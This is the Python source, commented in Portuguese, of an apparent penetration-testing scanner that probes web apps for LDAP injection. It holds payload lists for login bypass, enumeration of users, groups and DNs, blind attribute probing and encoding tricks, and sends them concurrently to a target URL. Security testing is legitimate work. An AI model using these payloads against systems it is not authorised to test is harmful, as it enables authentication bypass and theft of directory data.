#!/usr/bin/env python3
"""Modulo de deteccao de LDAP Injection.

Testa se o servidor e vulneravel a injecao LDAP via:
  - Auth bypass — fecha filtro LDAP e injeta condicao verdadeira
  - Search — enumeracao de usuarios, grupos e atributos
  - Blind — exfiltracao via timing ou diferencas de resposta
  - Bypass — encoding e caracteres especiais para contornar filtros

Fluxo:
  1. Envia payloads de deteccao em parametros de busca/user
 2. Verifica se a resposta indica bypass de autenticacao ou enumeracao
  3. Se detectado, envia payloads de exploit (enum users, groups, attrs)
  4. Classifica: detectado, blocked, error
  5. Retorna resultado consolidado com severidade
"""

import argparse
import logging
from dataclasses import asdict, dataclass

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    init_scanner,
    print_exploit_info,
    print_json,
    run_concurrent,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.ldapiinject")

_CATEGORY_MAP: dict[str, list[str]] = {
    "detect": ["wildcard", "close_filter", "always_true", "objectclass", "presence"],
    "auth_bypass": [
        "admin_or",
        "close_paren",
        "star_close",
        "admin_true",
        "null_bypass",
    ],
    "search": ["enum_users", "enum_groups", "enum_attrs", "enum_dn", "wildcard_all"],
    "blind": ["blind_user", "blind_pass", "blind_dn", "blind_email", "blind_member"],
    "bypass": [
        "unicode_bypass",
        "null_terminator",
        "double_encode",
        "space_bypass",
        "special_chars",
    ],
}

_DETECT_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "wildcard",
        "*",
        ["success", "welcome", "token", "result", "found"],
    ),
    (
        "close_filter",
        "*)(&)",
        ["success", "welcome", "token", "result", "error"],
    ),
    (
        "always_true",
        "*)(objectClass=*)",
        ["success", "welcome", "token", "result", "dn"],
    ),
    (
        "objectclass",
        "*)(objectClass=user)",
        ["success", "welcome", "token", "result", "user"],
    ),
    (
        "presence",
        "*)(|(cn=*))",
        ["success", "welcome", "token", "result", "cn"],
    ),
]

_AUTH_BYPASS_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "admin_or",
        "admin)(|(password=*))",
        ["success", "welcome", "token", "dashboard", "admin"],
    ),
    (
        "close_paren",
        "*)(cn=*)",
        ["success", "welcome", "token", "result", "cn"],
    ),
    (
        "star_close",
        "*)(uid=*)",
        ["success", "welcome", "token", "result", "uid"],
    ),
    (
        "admin_true",
        "admin)(&)",
        ["success", "welcome", "token", "dashboard", "admin"],
    ),
    (
        "null_bypass",
        "admin\x00",
        ["success", "welcome", "token", "dashboard"],
    ),
]

_SEARCH_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "enum_users",
        "*)(|(uid=*))",
        ["uid", "user", "admin", "root", "dn"],
    ),
    (
        "enum_groups",
        "*)(|(memberOf=*))",
        ["group", "admin", "member", "cn"],
    ),
    (
        "enum_attrs",
        "*)(objectClass=*)",
        ["cn", "sn", "mail", "uid", "dn"],
    ),
    (
        "enum_dn",
        "*)(|(distinguishedName=*))",
        ["dn", "distinguishedName", "ou=", "cn="],
    ),
    (
        "wildcard_all",
        "*()",
        ["success", "result", "found", "dn"],
    ),
]

_BLIND_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "blind_user",
        "*)(uid=admin*)",
        ["success", "welcome", "token"],
    ),
    (
        "blind_pass",
        "*)(userPassword=*)",
        ["success", "welcome", "token"],
    ),
    (
        "blind_dn",
        "*)(distinguishedName=*)",
        ["success", "welcome", "token"],
    ),
    (
        "blind_email",
        "*)(mail=*)",
        ["success", "welcome", "token"],
    ),
    (
        "blind_member",
        "*)(memberOf=cn=admin*)",
        ["success", "welcome", "token"],
    ),
]

_BYPASS_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "unicode_bypass",
        "admin\u0000)",
        ["success", "welcome", "token", "dashboard"],
    ),
    (
        "null_terminator",
        "*\x00)(objectClass=*)",
        ["success", "welcome", "token", "result"],
    ),
    (
        "double_encode",
        "admin%00)(objectClass=*)",
        ["success", "welcome", "token", "result"],
    ),
    (
        "space_bypass",
        "* )(&)",
        ["success", "welcome", "token", "result"],
    ),
    (
        "special_chars",
        "*\\2a)(objectClass=*)",
        ["success", "welcome", "token", "result"],
    ),
]

_LDAP_PARAMS: list[str] = [
    "user",
    "username",
    "login",
    "search",
    "filter",
    "query",
    "uid",
    "dn",
    "cn",
    "mail",
    "member",
    "email",
]


@dataclass(frozen=True, slots=True)
class LDAPiAttempt:
    """Tentativa individual de LDAP Injection."""

    technique: str
    category: str
    payload: str
    param: str
    method: str
    status_baseline: int
    status_test: int
    size_baseline: int
    size_test: int
    status_changed: bool
    size_changed: bool
    vulnerable: bool
    details: str
    error: str
    exploit: str = ""
    tool: str = ""


@dataclass(frozen=True, slots=True)
class LDAPiResult:
    """Resultado consolidado do scan de LDAP Injection."""

    target: str
    baseline_status: int
    baseline_size: int
    tls: bool
    attempts: list[LDAPiAttempt]
    vulnerable_techniques: list[str]
    blocked_techniques: list[str]
    issues: list[str]
    overall_status: str


async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int, bytes]:
    """Envia requisicao baseline para obter resposta de referencia."""
    try:
        resp = await client.get(url, follow_redirects=False)
        return resp.status_code, len(resp.content), resp.content
    except httpx.RequestError:
        return 0, 0, b""


def _check_ldap_response(
    body: bytes,
    status: int,
    indicators: list[str],
    baseline_body: bytes = b"",
) -> bool:
    """Verifica se a resposta indica LDAP injection bem-sucedido.

    Indicador conta apenas se presente no corpo do teste e ausente no
    corpo baseline (baseline diff) — evita falsos positivos em paginas
    normais que contem palavras genericas como "success" ou "user".
    """
    text = body.decode("utf-8", errors="ignore").lower()
    if status == 0:
        return False
    b_text = baseline_body.decode("utf-8", errors="ignore").lower()
    return any(
        indicator.lower() in text and indicator.lower() not in b_text
        for indicator in indicators
    )


async def _test_detect(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[LDAPiAttempt]:
    """Testa LDAP injection basico com payloads de deteccao."""
    attempts: list[LDAPiAttempt] = []
    b_status, b_size, b_body = baseline

    for technique, payload, indicators in _DETECT_PAYLOADS:
        for param in _LDAP_PARAMS[:6]:
            for method in ("post_form", "query"):
                try:
                    if method == "post_form":
                        resp = await client.post(
                            base_url,
                            data={param: payload},
                            follow_redirects=False,
                        )
                    else:
                        resp = await client.get(
                            base_url,
                            params={param: payload},
                            follow_redirects=False,
                        )

                    t_status = resp.status_code
                    t_size = len(resp.content)
                    status_changed = t_status != b_status
                    vulnerable = _check_ldap_response(
                        resp.content, t_status, indicators, baseline_body=b_body
                    )

                    attempts.append(
                        LDAPiAttempt(
                            exploit="admin)(!(|(password=*)))",
                            tool="hydra",
                            technique=f"{technique}_{param}",
                            category="detect",
                            payload=payload,
                            param=param,
                            method=method,
                            status_baseline=b_status,
                            status_test=t_status,
                            size_baseline=b_size,
                            size_test=t_size,
                            status_changed=status_changed,
                            size_changed=abs(t_size - b_size) > 50,
                            vulnerable=vulnerable,
                            details=f"Status {b_status}->{t_status}"
                            if status_changed
                            else "Sem mudanca",
                            error="",
                        )
                    )
                except httpx.RequestError as exc:
                    attempts.append(
                        LDAPiAttempt(
                            technique=f"{technique}_{param}",
                            category="detect",
                            payload=payload,
                            param=param,
                            method=method,
                            status_baseline=b_status,
                            status_test=0,
                            size_baseline=b_size,
                            size_test=0,
                            status_changed=False,
                            size_changed=False,
                            vulnerable=False,
                            details="",
                            error=str(exc),
                        )
                    )

    return attempts


async def _test_auth_bypass(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[LDAPiAttempt]:
    """Testa bypass de autenticacao LDAP."""
    attempts: list[LDAPiAttempt] = []
    b_status, b_size, b_body = baseline

    for technique, payload, indicators in _AUTH_BYPASS_PAYLOADS:
        for param in ["user", "username", "login", "uid"]:
            for method in ("post_form", "query"):
                try:
                    if method == "post_form":
                        resp = await client.post(
                            base_url,
                            data={param: payload, "password": "anything"},
                            follow_redirects=False,
                        )
                    else:
                        resp = await client.get(
                            base_url,
                            params={param: payload, "password": "anything"},
                            follow_redirects=False,
                        )

                    t_status = resp.status_code
                    t_size = len(resp.content)
                    status_changed = t_status != b_status
                    vulnerable = _check_ldap_response(
                        resp.content, t_status, indicators, baseline_body=b_body
                    )

                    attempts.append(
                        LDAPiAttempt(
                            exploit="admin)(!(|(password=*)))",
                            tool="hydra",
                            technique=f"{technique}_{param}",
                            category="auth_bypass",
                            payload=payload,
                            param=param,
                            method=method,
                            status_baseline=b_status,
                            status_test=t_status,
                            size_baseline=b_size,
                            size_test=t_size,
                            status_changed=status_changed,
                            size_changed=abs(t_size - b_size) > 50,
                            vulnerable=vulnerable,
                            details=f"Status {b_status}->{t_status}"
                            if status_changed
                            else "Sem mudanca",
                            error="",
                        )
                    )
                except httpx.RequestError as exc:
                    attempts.append(
                        LDAPiAttempt(
                            technique=f"{technique}_{param}",
                            category="auth_bypass",
                            payload=payload,
                            param=param,
                            method=method,
                            status_baseline=b_status,
                            status_test=0,
                            size_baseline=b_size,
                            size_test=0,
                            status_changed=False,
                            size_changed=False,
                            vulnerable=False,
                            details="",
                            error=str(exc),
                        )
                    )

    return attempts


async def _test_search(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[LDAPiAttempt]:
    """Testa enumeracao via busca LDAP."""
    attempts: list[LDAPiAttempt] = []
    b_status, b_size, b_body = baseline

    for technique, payload, indicators in _SEARCH_PAYLOADS:
        for param in ["search", "filter", "query", "dn"]:
            for method in ("post_form", "query"):
                try:
                    if method == "post_form":
                        resp = await client.post(
                            base_url,
                            data={param: payload},
                            follow_redirects=False,
                        )
                    else:
                        resp = await client.get(
                            base_url,
                            params={param: payload},
                            follow_redirects=False,
                        )

                    t_status = resp.status_code
                    t_size = len(resp.content)
                    status_changed = t_status != b_status
                    vulnerable = _check_ldap_response(
                        resp.content, t_status, indicators, baseline_body=b_body
                    )

                    attempts.append(
                        LDAPiAttempt(
                            exploit="admin)(!(|(password=*)))",
                            tool="hydra",
                            technique=f"{technique}_{param}",
                            category="search",
                            payload=payload,
                            param=param,
                            method=method,
                            status_baseline=b_status,
                            status_test=t_status,
                            size_baseline=b_size,
                            size_test=t_size,
                            status_changed=status_changed,
                            size_changed=abs(t_size - b_size) > 50,
                            vulnerable=vulnerable,
                            details=f"Status {b_status}->{t_status}"
                            if status_changed
                            else "Sem mudanca",
                            error="",
                        )
                    )
                except httpx.RequestError as exc:
                    attempts.append(
                        LDAPiAttempt(
                            technique=f"{technique}_{param}",
                            category="search",
                            payload=payload,
                            param=param,
                            method=method,
                            status_baseline=b_status,
                            status_test=0,
                            size_baseline=b_size,
                            size_test=0,
                            status_changed=False,
                            size_changed=False,
                            vulnerable=False,
                            details="",
                            error=str(exc),
                        )
                    )

    return attempts


async def _test_blind(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[LDAPiAttempt]:
    """Testa LDAP injection cega."""
    attempts: list[LDAPiAttempt] = []
    b_status, b_size, b_body = baseline

    for technique, payload, indicators in _BLIND_PAYLOADS:
        for param in ["user", "username", "uid", "login"]:
            try:
                resp = await client.get(
                    base_url,
                    params={param: payload},
                    follow_redirects=False,
                )

                t_status = resp.status_code
                t_size = len(resp.content)
                status_changed = t_status != b_status
                vulnerable = _check_ldap_response(
                    resp.content, t_status, indicators, baseline_body=b_body
                )

                attempts.append(
                    LDAPiAttempt(
                        exploit="admin)(!(|(password=*)))",
                        tool="hydra",
                        technique=f"{technique}_{param}",
                        category="blind",
                        payload=payload,
                        param=param,
                        method="query",
                        status_baseline=b_status,
                        status_test=t_status,
                        size_baseline=b_size,
                        size_test=t_size,
                        status_changed=status_changed,
                        size_changed=abs(t_size - b_size) > 50,
                        vulnerable=vulnerable,
                        details=f"Status {b_status}->{t_status}"
                        if status_changed
                        else "Sem mudanca",
                        error="",
                    )
                )
            except httpx.RequestError as exc:
                attempts.append(
                    LDAPiAttempt(
                        technique=f"{technique}_{param}",
                        category="blind",
                        payload=payload,
                        param=param,
                        method="query",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(exc),
                    )
                )

    return attempts


async def _test_bypass(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[LDAPiAttempt]:
    """Testa bypass de filtragem LDAP."""
    attempts: list[LDAPiAttempt] = []
    b_status, b_size, b_body = baseline

    for technique, payload, indicators in _BYPASS_PAYLOADS:
        for param in ["user", "username", "search"]:
            try:
                resp = await client.post(
                    base_url,
                    data={param: payload},
                    follow_redirects=False,
                )

                t_status = resp.status_code
                t_size = len(resp.content)
                status_changed = t_status != b_status
                vulnerable = _check_ldap_response(
                    resp.content, t_status, indicators, baseline_body=b_body
                )

                attempts.append(
                    LDAPiAttempt(
                        exploit="admin)(!(|(password=*)))",
                        tool="hydra",
                        technique=f"{technique}_{param}",
                        category="bypass",
                        payload=payload,
                        param=param,
                        method="post_form",
                        status_baseline=b_status,
                        status_test=t_status,
                        size_baseline=b_size,
                        size_test=t_size,
                        status_changed=status_changed,
                        size_changed=abs(t_size - b_size) > 50,
                        vulnerable=vulnerable,
                        details=f"Status {b_status}->{t_status}"
                        if status_changed
                        else "Sem mudanca",
                        error="",
                    )
                )
            except httpx.RequestError as exc:
                attempts.append(
                    LDAPiAttempt(
                        technique=f"{technique}_{param}",
                        category="bypass",
                        payload=payload,
                        param=param,
                        method="post_form",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(exc),
                    )
                )

    return attempts


def print_results(result: LDAPiResult) -> None:
    """Exibe os resultados do scan de LDAP Injection."""
    print(color("\n" + "=" * 60, Cyber.GRAY))
    print(color("  LDAP INJECTION — RESULTADOS", Cyber.CYAN, Cyber.BOLD))
    print(color("=" * 60, Cyber.GRAY))

    print(color(f"  Target:     {result.target}", Cyber.WHITE))
    print(
        color(
            f"  Baseline:   {result.baseline_status} ({result.baseline_size} bytes)",
            Cyber.GRAY,
        )
    )
    print(color(f"  Total:      {len(result.attempts)} testes realizados", Cyber.GRAY))

    vuln_techs = result.vulnerable_techniques
    if vuln_techs:
        print(
            color(
                f"\n  [!] {len(vuln_techs)} TECNICAS VULNERAVEIS", Cyber.RED, Cyber.BOLD
            )
        )
        for tech in vuln_techs[:10]:
            print(color(f"      [!] {tech}", Cyber.RED))
            a = next((a for a in result.attempts if a.technique == tech), None)
            if a:
                print_exploit_info(a.exploit, a.tool)
        print(color("\n  Severidade: ALTA", Cyber.RED, Cyber.BOLD))
    else:
        print(
            color("\n  [+] Nenhuma LDAP Injection detectada", Cyber.GREEN, Cyber.BOLD)
        )
        print(color("  Severidade: NENHUMA", Cyber.GREEN, Cyber.BOLD))

    issues = result.issues
    if issues:
        print(color(f"\n  Problemas ({len(issues)}):", Cyber.YELLOW, Cyber.BOLD))
        for issue in issues[:10]:
            print(color(f"      {issue}", Cyber.YELLOW))

    errors = [a for a in result.attempts if a.error]
    if errors:
        print(color(f"\n  Erros ({len(errors)}):", Cyber.GRAY))
        for e in errors[:3]:
            print(color(f"      {e.error[:80]}", Cyber.GRAY))

    print(color("=" * 60, Cyber.GRAY))


async def run_scan(
    target: str,
    categories: list[str],
    timeout: int,
    concurrency: int,
    output_file: str | None,
    verbose: bool,
    proxy: str | None = None,
    json_output: bool = False,
) -> int:
    """Executa o scan LDAP Injection."""
    tls = target.startswith("https")
    client = create_async_client(timeout=timeout, proxy=proxy)
    try:
        print(color(f"\n  Conectando a {target}...", Cyber.CYAN))
        baseline = await _test_baseline(client, target)
        if baseline[0] == 0:
            print(color("  [!] Falha ao conectar no alvo", Cyber.RED))
            return 1

        print(color(f"  Baseline: {baseline[0]} ({baseline[1]} bytes)", Cyber.GRAY))

        run_categories = categories or list(_CATEGORY_MAP.keys())
        all_attempts: list[LDAPiAttempt] = []

        coros = []
        for cat in run_categories:
            if cat == "detect":
                coros.append(_test_detect(client, target, baseline))
            elif cat == "auth_bypass":
                coros.append(_test_auth_bypass(client, target, baseline))
            elif cat == "search":
                coros.append(_test_search(client, target, baseline))
            elif cat == "blind":
                coros.append(_test_blind(client, target, baseline))
            elif cat == "bypass":
                coros.append(_test_bypass(client, target, baseline))

        if coros:
            for r in await run_concurrent(coros, concurrency):
                if isinstance(r, list):
                    all_attempts.extend(r)

        vuln_techs = [a.technique for a in all_attempts if a.vulnerable]
        blocked = [
            a.technique for a in all_attempts if not a.vulnerable and not a.error
        ]
        issues: list[str] = [
            f"VULN: {att.technique} - {att.details}"
            for att in all_attempts
            if att.vulnerable
        ]

        overall = "vulnerable" if vuln_techs else "secure"

        result = LDAPiResult(
            target=target,
            baseline_status=baseline[0],
            baseline_size=baseline[1],
            tls=tls,
            attempts=all_attempts,
            vulnerable_techniques=vuln_techs,
            blocked_techniques=blocked,
            issues=issues,
            overall_status=overall,
        )

        if json_output:
            print_json(asdict(result))
        else:
            print_results(result)

        if output_file:
            write_output(output_file, asdict(result))

        logger.info(
            "LDAPi scan concluido: %d testes, %d vulneraveis",
            len(all_attempts),
            len(vuln_techs),
        )
        return 1 if vuln_techs else 0

    finally:
        await client.aclose()


banner_art = create_banner(
    r"""
     ___  ______  _____ ______   ______             ______           _     _  _
    | _ \ | ___ \/ ____|___  /  | ___ \           | ___ \         | |   | || |
    | |/ / | |_/ / |      / /   | |_/ / __ _  __ _| |_/ / __ _  __| | __| || |_
    | |\ \ |    /| |     / /    | ___ \/ _` |/ _` |    / / _` |/ _` |/ _` | __|
    | |_\ \| |\ \| |___ / /___  | |_/ / (_| | (_| | |\ \ (_| | (_| | (_| | |_
     \____/\_| \_\\____/\_____/  \____/ \__,_|\__, \_| \_\__,_|\__,_|\__,_|\__|
                                              __/ |
                                             |___/
    """,
    "LDAP Injection — detecta injecao LDAP em web apps",
)


def build_parser() -> argparse.ArgumentParser:
    """Constrói o parser de argumentos CLI."""
    parser = argparse.ArgumentParser(
        prog="mytools-ldapi",
        description="LDAP Injection — detecta injecao LDAP em web apps",
    )
    parser.add_argument("url", help="URL alvo (ex: https://example.com)")
    parser.add_argument(
        "-c",
        "--category",
        choices=list(_CATEGORY_MAP.keys()),
        help="Categoria de testes (default: todas)",
    )
    parser.add_argument(
        "--concurrency",
        type=int,
        default=5,
        help="Requisicoes simultaneas (default: 5)",
    )
    add_common_args(parser, "web")
    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan LDAP Injection a partir de argumentos parseados."""
    init_scanner(args)
    logger.info("LDAPi scan iniciado para %s", args.url)
    categories: list[str] = []
    if getattr(args, "category", None):
        categories = [args.category]
    return safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=categories,
            timeout=getattr(args, "timeout", 10),
            concurrency=getattr(args, "concurrency", 5),
            output_file=getattr(args, "output", None),
            verbose=getattr(args, "verbose", False),
            proxy=getattr(args, "proxy", None),
            json_output=getattr(args, "json_output", False),
        ),
    )


def main() -> int:
    """Ponto de entrada principal."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(
            getattr(a, "url", None) or getattr(a, "target", None)
        ),
        prompt="ldap> ",
        description="LDAP Injection interativo.",
        example="https://target.com -c detect",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c detect\n"
            "  https://target.com -c auth_bypass\n"
            "  https://target.com -c bypass --proxy http://127.0.0.1:8080"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
